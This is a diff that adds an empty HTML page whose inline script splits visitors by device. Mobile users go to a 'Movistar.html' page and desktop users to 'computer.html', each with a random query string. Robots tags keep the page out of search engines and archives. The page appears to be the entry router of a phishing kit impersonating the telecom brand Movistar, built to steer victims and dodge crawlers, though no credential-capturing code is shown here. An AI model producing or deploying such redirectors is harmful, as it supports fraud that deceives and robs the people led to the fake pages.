@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥4runner 🔥</title>
+    <link rel="canonical" href="./Camarasdigitales.html">
+    <meta name="theme-color" content="#563d7c">
+    <meta property="og:url" content="./Camarasdigitales.html">
+    <meta name="robots" content="NOINDEX,NOFOLLOW,NOARCHIVE,NOODP,NOSNIPPET">
+    <script>
+        function generateRandomString(length) {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        const device = navigator.userAgent;
+        if (/iPhone|iPod|Android|J2ME|BlackBerry|Opera Mini|IEMobile|Mobile|Windows Phone|windows mobile|windows ce|webOS|palm|bada|series60|nokia|symbian|HTC/i.test(device)) {
+            window.location = "./Movistar.html?" + generateRandomString(7);
+        } else {
+            window.location = "./computer.html?" + generateRandomString(7);
+        }
+    </script>
+</head>
+<body>
+</body>
+</html>
